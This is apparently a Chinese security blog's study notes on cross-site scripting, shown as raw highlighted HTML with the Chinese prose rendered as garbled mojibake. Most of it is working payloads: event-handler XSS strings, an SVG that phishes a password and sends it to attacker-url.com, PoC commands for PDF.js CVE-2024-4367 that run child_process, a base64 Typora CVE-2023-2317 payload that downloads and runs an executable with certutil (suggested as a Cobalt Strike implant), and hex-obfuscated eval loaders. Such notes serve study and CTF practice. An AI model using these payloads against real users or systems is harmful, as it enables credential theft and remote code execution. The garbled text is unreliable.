function">visitAsBot</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">,</span> <span class="token string">'--disable-setuid-sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>            <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token constant">FLAG</span><span class="token punctuation">,</span>            <span class="token literal-property property">domain</span><span class="token operator">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>            <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>            <span class="token literal-property property">httpOnly</span><span class="token operator">:</span> <span class="token boolean">false</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:3000/botview?content=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'networkidle2'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯åŠ¨æ— å¤´ nosandbox çš„ chrome æµè§ˆå™¨ï¼Œæ–°å»ºé¡µé¢ï¼Œæ·»åŠ  cookieï¼Œç„¶åè·³è½¬è®¿é—®é¡µé¢</p><hr><h1 id="å¸¸è§payload"><a href="#å¸¸è§payload" class="headerlink" title="å¸¸è§payload"></a>å¸¸è§payload</h1><p>äº‹å®ä¸Šï¼Œä¸åªæœ‰ script æ ‡ç­¾å¯ä»¥æ‰§è¡Œ javascript</p><p><a href="https://github.com/payloadbox/xss-payload-list/tree/master">https://github.com/payloadbox/xss-payload-list/tree/master</a></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">[</span><span class="token string">'alert'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script src='/**/alert(1)//'>&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="åå°„å‹-XSS"><a href="#åå°„å‹-XSS" class="headerlink" title="åå°„å‹ XSS"></a>åå°„å‹ XSS</h1><h2 id="404"><a href="#404" class="headerlink" title="404"></a>404</h2><p>å–œæ¬¢é‡å†™ 404 çš„å°æœ‹å‹ä»¬ä½ ä»¬å¥½å•Šï¼Œæˆ‘æ˜¯ xssï¼ˆ</p><p>ç›´æ¥åœ¨ html ä¸Šè¾“å‡ºå¯æ§å†…å®¹æ˜¯å±é™©çš„è®¾è®¡</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">theme_include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'header'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content wrap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Page not found<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Unfortunately, the page <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span>/<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">current_url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span> could not be found. Your best bet is either to try the <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">base_url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>homepage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>, try <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>searching<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>, or go and cry in a corner (although I donâ€™t recommend the latter).<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">theme_include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'footer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> request<span class="token punctuation">.</span>path    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string"> not found"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">decodeURI</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> : invalid path</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 404 é¡µé¢</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="å­˜å‚¨å‹-XSS"><a href="#å­˜å‚¨å‹-XSS" class="headerlink" title="å­˜å‚¨å‹ XSS"></a>å­˜å‚¨å‹ XSS</h1><p><a href="https://www.freebuf.com/articles/web/261918.html">https://www.freebuf.com/articles/web/261918.html</a></p><h2 id="svg"><a href="#svg" class="headerlink" title="svg"></a>svg</h2><p>å¯èƒ½å‡ºç°åœ¨æ”¯æŒä¸Šä¼  svg å›¾ç‰‡çš„å¤´åƒå¤„</p><p>å¯å°è¯•æ„é€  svg æ–‡ä»¶ï¼Œå¦‚æœèƒ½å¤Ÿè®¿é—®åˆ™ä¼šè§¦å‘ xss</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" standalone="no"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">svg</span> <span class="token name">PUBLIC</span> <span class="token string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="token string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">baseProfile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>triangle<span class="token punctuation">"</span></span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0,0 0,50 50,0<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#009901<span class="token punctuation">"</span></span> <span class="token attr-name">stroke</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#004400<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/09/17/XSS-Re-Master/image-20250509084952919.png" alt="image-20250509084952919"></p><p>å¸¦å¤–</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" standalone="no"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">svg</span> <span class="token name">PUBLIC</span> <span class="token string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="token string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">baseProfile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>triangle<span class="token punctuation">"</span></span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0,0 0,50 50,0<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#009900<span class="token punctuation">"</span></span> <span class="token attr-name">stroke</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#004400<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">                 <span class="token keyword">var</span> passwd <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">"Enter your password to continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"https://attacker-url.com/log.php?password="</span><span class="token operator">+</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>pdf æ”¯æŒåµŒå…¥ javascriptï¼Œé‚£ä¹ˆå°±æœ‰è¯´æ³•äº†</p><h3 id="ç¦æ˜•Foxit-PDFï¼ˆCVE-2023-27363ï¼‰"><a href="#ç¦æ˜•Foxit-PDFï¼ˆCVE-2023-27363ï¼‰" class="headerlink" title="ç¦æ˜•Foxit PDFï¼ˆCVE-2023-27363ï¼‰"></a>ç¦æ˜•Foxit PDFï¼ˆCVE-2023-27363ï¼‰</h3><p>å¼ºç½‘æ¯ S8 Final æ•´äº†ä¸ªç±»ä¼¼çš„ï¼Œä½†æ˜¯è¦æ±‚ä¸€æ­¥åˆ°ä½</p><p><a href="https://github.com/webraybtl/CVE-2023-27363">https://github.com/webraybtl/CVE-2023-27363</a></p><p><a href="https://github.com/CN016/-Foxit-PDF-CVE-2023-27363-">https://github.com/CN016/-Foxit-PDF-CVE-2023-27363-</a></p><p><a href="https://blog.csdn.net/C20220511/article/details/131397568">https://blog.csdn.net/C20220511/article/details/131397568</a></p><hr><h3 id="PDF-jsï¼ˆCVE-2024-4367ï¼‰"><a href="#PDF-jsï¼ˆCVE-2024-4367ï¼‰" class="headerlink" title="PDF.jsï¼ˆCVE-2024-4367ï¼‰"></a>PDF.jsï¼ˆCVE-2024-4367ï¼‰</h3><blockquote><p>å½“ PDF.js é…ç½® isEvalSupported é€‰é¡¹è®¾ç½®ä¸º trueï¼ˆé»˜è®¤å€¼ï¼‰æ—¶ï¼Œä¼šå°†è¾“å…¥ä¼ é€’åˆ°ç‰¹å®šå‡½æ•°</p></blockquote><p>å½±å“ç‰ˆæœ¬ï¼š</p><ul><li>Mozilla PDF.js &lt;4.2.67</li><li>pdfjs - dist (npm) &lt; 4.2.67</li><li>react - pdf (npm) &lt; 7.7.3 ä»¥åŠ 8.0.0 &lt;&#x3D; react - pdf (npm) &lt; 8.0.2</li></ul><p><a href="https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed">https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 CVE-2024-4367.py <span class="token string">"alert(1);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®© pdf.js é¢„è§ˆç”Ÿæˆçš„ pdf</p><p><img src="/blog/2025/09/17/XSS-Re-Master/IMG-20250918112439555.png"></p><p>å¦‚æœæœ‰ä½¿ç”¨è¿™äº›ç‰ˆæœ¬ pdf.js çš„å®¢æˆ·ç«¯ï¼Œåˆ™å¯ä»¥è€ƒè™‘ RCE</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 CVE-2024-4367.py <span class="token string">"require('child_process').exec('calc');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="markdownï¼ˆCVE-2023-2317-Typora-RCEï¼‰"><a href="#markdownï¼ˆCVE-2023-2317-Typora-RCEï¼‰" class="headerlink" title="markdownï¼ˆCVE-2023-2317 Typora RCEï¼‰"></a>markdownï¼ˆCVE-2023-2317 Typora RCEï¼‰</h2><p><a href="https://www.freebuf.com/articles/others-articles/376873.html">https://www.freebuf.com/articles/others-articles/376873.html</a></p><p>Typora &lt; 1.6.7</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>typora://app/typemark/updater/updater.html?curVersion=a&amp;newVersion=b&amp;releaseNoteLink=c&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3Csvg%2Fonload%3Dtop.eval(%60reqnode('child_process').exec('calc')%60)%3E%3C%2Fsvg%3E%22,%22%22,%22%22,%22%22,%22%22]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯æ¢æˆ cs é©¬</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">height</span><span class="token punctuation">:</span>0<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NlcnR1dGlsLmV4ZSAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xOTIuMTY4LjE0Mi4xMjg6ODk5Mi8xMjEyLmV4ZSAxMjEyLmV4ZSAmJiAxMjEyLmV4ZScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p'))>&lt;%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="å¸¸è§„è¿‡æ»¤"><a href="#å¸¸è§„è¿‡æ»¤" class="headerlink" title="å¸¸è§„è¿‡æ»¤"></a>å¸¸è§„è¿‡æ»¤</h1><p>ç©ºæ ¼æ›¿æ¢ï¼š<code>/**/</code>ï¼Œ<code>%09</code>ï¼ˆtabï¼‰ï¼Œ<code>%0c</code>ï¼ˆæ¢é¡µç¬¦ï¼‰ï¼Œ<code>/</code></p><p>å¤§å°å†™ç»•è¿‡ï¼š<code>&lt;sCRipT&gt;</code></p><p>HTML ç¼–ç ï¼š<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;colon;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;lpar;&amp;#49;&amp;rpar;</code></p><p><code>String.fromCharCode()</code> ï¼šå°† UTF-16 ç¼–ç è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">82</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>eval()</code>ï¼šå°†ä¼ å…¥çš„å­—ç¬¦ä¸²å½“åš JavaScript ä»£ç è¿›è¡Œæ‰§è¡Œï¼Œæ”¯æŒåå…­è¿›åˆ¶å­—ç¬¦ä¸²</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;body/onload=eval("\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x36\x30\x2c\x31\x31\x35\x2c\x36\x37\x2c\x31\x31\x34\x2c\x37\x33\x2c\x31\x31\x32\x2c\x31\x31\x36\x2c\x33\x32\x2c\x31\x31\x35\x2c\x31\x31\x34\x2c\x36\x37\x2c\x36\x31\x2c\x34\x37\x2c\x34\x37\x2c\x31\x32\x30\x2c\x31\x31\x35\x2c\x34\x36\x2c\x31\x31\x35\x2c\x39\x38\x2c\x34\x37\x2c\x38\x39\x2c\x38\x34\x2c\x38\x35\x2c\x31\x30\x34\x2c\x36\x32\x2c\x36\x30\x2c\x34\x37\x2c\x31\x31\x35\x2c\x36\x37\x2c\x38\x32\x2c\x31\x30\x35\x2c\x31\x31\x32\x2c\x38\x34\x2c\x36\x32\x29\x29\x3b")>&lt;!--document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,47,47,120,115,46,115,98,47,89,84,85,104,62,60,47,115,67,82,105,112,84,62));<span aria-hidden="true" 